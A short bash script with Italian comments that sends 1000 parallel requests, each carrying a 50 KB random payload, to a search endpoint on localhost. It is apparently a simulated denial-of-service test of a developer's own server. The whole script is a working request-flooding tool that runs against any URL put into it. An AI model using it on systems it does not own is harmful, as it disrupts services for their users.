#!/bin/bash

# URL della rotta da attaccare
URL="http://localhost:8000/articles/search"

# Generare un grande payload casuale
LARGE_PAYLOAD=$(head -c 50000 < /dev/urandom | base64)

# Numero di richieste da inviare
NUM_REQUESTS=1000

# Limite massimo di processi simultanei
MAX_PARALLEL_REQUESTS=50

# Funzione per eseguire la richiesta
send_request() {
    curl -G "$URL" --data-urlencode "query=$LARGE_PAYLOAD" > /dev/null 2>&1
}

# Controlla la memoria libera
check_memory() {
    # Memoria libera in MB
    FREE_MEM=$(free -m | awk '/^Mem:/{print $4}')
    
    # Se la memoria disponibile è inferiore a 100MB, sospendi lo script
    if [[ "$FREE_MEM" -lt 100 ]]; then
        echo "Memoria bassa ($FREE_MEM MB), attendo 10 secondi prima di riprendere..."
        sleep 10
    fi
}

# Esegui richieste in parallelo con limitazione
run_requests() {
    echo "Inizio attacco DoS simulato..."

    for ((i=1; i<=NUM_REQUESTS; i++))
    do
        # Controlla la memoria disponibile prima di lanciare nuove richieste
        check_memory

        # Lancia la richiesta in background
        send_request &
        echo "Richiesta $i inviata"

        # Controlla il numero di processi in background
        if [[ $(jobs -r -p | wc -l) -ge $MAX_PARALLEL_REQUESTS ]]; then
            wait -n  # Aspetta che almeno un processo termini
        fi
    done

    # Aspetta che tutti i processi terminino
    wait
    echo "Attacco DoS simulato completato!"
}

# Avvia lo script
run_requests
